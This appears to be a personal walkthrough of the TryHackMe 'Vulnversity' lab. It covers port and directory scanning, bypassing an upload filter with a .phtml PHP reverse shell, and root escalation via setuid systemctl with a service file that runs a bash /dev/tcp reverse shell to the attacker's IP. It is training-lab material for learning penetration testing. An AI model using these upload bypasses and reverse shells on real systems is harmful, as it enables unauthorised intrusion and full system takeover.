*2021-08-24*

*kimm3*

# Walkthrough: Vulnversity
Platform: TryHackMe

Difficulty: Easy

- [Link](https://tryhackme.com/room/vulnversity)

As this is a room on TryHackMe I don't explore every single possibility, I awnser the questions and move on. I won't post any awnsers here or even refer to them - just showing how to hack the box, as intended.
## Setup
![ll](assets/markdown-img-paste-20210825123945244.png)

## Scans and enumeration
```
script history/vulnversity_enumeration.txt
export IP=10.10.115.128
ping $IP
sudo nmap $IP -p- -Pn -A -oA scans/nmap-init
```
![init-scan-ports](assets/markdown-img-paste-20210825125747822.png)

### http:3333
![vuln-index-3333](assets/markdown-img-paste-20210825125923677.png)

Vulnversity site with a bunch of links that dosen't lead anywhere.

`ffuf -u "http://10.10.115.128:3333/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -of md -o scans/ffuf-dir-p3333`

![ffuf-dir-p3333](assets/markdown-img-paste-20210825130406151.png)

'internal' is not a standard folder.

![internal](assets/markdown-img-paste-20210825130445381.png)

Let's try to upload something.

`touch upload/test`

![ext-not-allowed](assets/markdown-img-paste-20210825141320500.png)

Ok, let's try find an extension that works using Burpe.

![request](assets/markdown-img-paste-20210825141649236.png)

Intercept the request and press CTRL+I to send it to intruder.

![position](assets/markdown-img-paste-2021082514182730.png)

Set position at end of filename.

![payload](assets/markdown-img-paste-20210825141912358.png)

Load SecLists 'web-extensions.txt'.

![payload-encode](assets/markdown-img-paste-20210825141944524.png)

Turn off the URL encoding, or at least remove the dot so that it dosen't mess with the filename.

![filter](assets/markdown-img-paste-20210825142141733.png)

Filter by length to get the one that stands out.

![phtmlsuccess](assets/markdown-img-paste-20210825142210644.png)

So it accept '.phtml'-files and the site is a .php-site, let's try to get a php reverse shell working.

## Foothold
Search for php in `/usr/share/` in kali to get the shell I used.

```
cp tools/php-reverse-shell.php upload/mashell.phtml
vim upload/mashell.phtml
# Change to your tunnel IP, and check port
nc -lvnp 1234
curl "http://10.10.115.128:3333/internal/mashell.phtml"
```

The upload succeeds and I try to curl the file in the same dir but nothing is found.

`ffuf -u "http://10.10.115.128:3333/internal/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -of md -o scans/ffuf-dir-internal`

![uploads](assets/markdown-img-paste-20210825143422812.png)

Worth a shot.

`curl "http://10.10.115.128:3333/internal/uploads/mashell.phtml"`

![foothold](assets/markdown-img-paste-20210825143530173.png)

Success.

![billflag](assets/markdown-img-paste-20210825143911841.png)

## Privilege Escalation
Search for all setUID files.

`find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

![systemctl](assets/markdown-img-paste-20210825144051251.png)

'systemctl' is usually reserved for root only. We can use this to start and stop services on the machine. We can also create our own service that elevates us to root via a reverse shell.

```
[Unit]
Description=pleaseElevate

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.210.115/1336 0>&1'

[Install]
WantedBy=multi-user.target
```

I created this service-file on my machine and started the python 'http.server'.

```
cd /tmp
curl "http://10.8.210.115/thisroot.service" > thisroot.service
chmod 777 thisroot.service
systemctl enable /tmp/thisroot.service
systemctl start thisroot
```

![roottxt](assets/markdown-img-paste-20210825150330867.png)
